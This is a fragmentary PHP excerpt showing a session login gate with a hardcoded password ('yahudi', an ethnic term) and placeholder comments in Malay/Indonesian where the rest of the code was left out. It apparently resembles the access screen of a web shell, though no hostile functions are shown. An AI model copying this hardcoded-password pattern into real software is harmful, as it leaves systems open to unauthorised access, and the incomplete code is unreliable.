...
session_start();
if (!isset($_SESSION['akses_izin'])) {
    if (isset($_POST['password_submit'])) {
        if ($_POST['password'] === 'yahudi') {
            $_SESSION['akses_izin'] = true;
        } else {
    ...
    if (!isset($_SESSION['akses_izin'])) {
        ...
        <button type="submit" name="password_submit">ACCESS</button>
...
// ... (SISANYE KOD TETAP SAMA SEPERTI ASLINYA, TIDAK DIUBAH) ...
// LANJUTKAN DENGAN KODE PHP ANDA SELANJUTNYA DARI SINI...
// (semua fungsi dan kode setelah ini tetap sama persis seperti aslinya)
...
<a href="?logout=1"><button type="button" style="background:#f00;"><i class="fas fa-sign-out-alt"></i> Logout</button></a>
</div>
</nav>
